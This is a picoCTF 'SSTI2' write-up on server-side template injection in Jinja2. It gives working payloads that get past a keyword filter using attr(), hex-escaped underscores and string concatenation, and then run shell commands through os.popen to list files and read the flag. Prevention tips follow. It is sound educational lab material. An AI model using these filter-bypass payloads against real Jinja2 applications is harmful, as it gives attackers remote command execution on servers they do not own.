
# SSTI CTF Challenge Writeup – SSTI2

**Platform:** picoCTF  
**Challenge Name:** SSTI2  
**Category:** Web Exploitation  
**Points:** 200  
**Date:** 2025-06-27

---

## Challenge Description

I made a cool website where you can announce whatever you want!  
I read about input sanitization, so now I remove any kind of characters that could be a problem :)

---

## Initial Observations

- User input is rendered in the template
- Basic math payload works, confirming SSTI
- Some keywords like `__class__` trigger: "Stop trying to break me >:("

---

## Exploitation Steps

### 1. Confirming SSTI
Payload:
```jinja2
{{ 7 * 7 }}
```
Output:
```
49
```

### 2. Accessing Internal Variables
Payload:
```jinja2
{{ config }}
```

### 3. Bypassing WAF / Filters

Blocked:
```jinja2
{{ config.__class__ }}
```

Bypass using attr() and hex:
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}
```

Full command execution payload:
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('__import__')('os')|attr('popen')('ls')|attr('read')() }}
```

### 4. Discovering Flag File
Output:
```
__pycache__  app.py  flag  requirements.txt
```

### 5. Reading the Flag with String Obfuscation
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('__import__')('os')|attr('popen')('c' ~ 'at fl' ~ 'ag')
|attr('read')() }}
```

---

## What I Learned

- How to detect and exploit Server-Side Template Injection (SSTI)
- Understanding Jinja2 context like `request`, `config`, etc.
- Filter bypass techniques using `attr()`, hex encoding, and string concatenation
- Achieving remote command execution through `popen().read()`

---

## Prevention Tips

- Never render raw user input in server-side templates
- Use sandboxed template engines or static rendering
- Properly escape all input before rendering
- Prefer whitelisting over blacklisting

---

## Flag

picoCTF{example_fake_flag_here}

---

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://jinja.palletsprojects.com/
